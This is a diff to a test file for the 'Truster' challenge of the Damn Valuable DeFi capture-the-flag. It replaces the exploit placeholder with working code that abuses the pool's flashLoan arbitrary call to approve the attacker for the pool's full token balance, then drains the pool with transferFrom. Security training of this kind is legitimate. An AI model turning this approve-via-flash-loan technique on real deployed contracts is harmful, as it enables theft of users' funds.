@@ -5,6 +5,7 @@ const DamnValuableToken = contract.fromArtifact('DamnValuableToken');
 const TrusterLenderPool = contract.fromArtifact('TrusterLenderPool');
 
 const { expect } = require('chai');
+const { web3 } = require('@openzeppelin/test-helpers/src/setup');
 
 describe('[Challenge] Truster', function () {
 
@@ -29,7 +30,22 @@ describe('[Challenge] Truster', function () {
     });
 
     it('Exploit', async function () {
-        /** YOUR EXPLOIT GOES HERE */
+
+        data = web3.eth.abi.encodeFunctionCall({
+            name: 'approve',
+            type: 'function',
+            inputs: [{
+                type: 'address',
+                name: 'spender'
+            },{
+                type: 'uint256',
+                name: 'amount'
+            }]
+        }, [attacker, TOKENS_IN_POOL.toString()]);
+
+        this.pool.flashLoan(0, attacker, this.token.address, data)
+        await this.token.transferFrom(this.pool.address, attacker, TOKENS_IN_POOL, { from: attacker})
+
     });
 
     after(async function () {
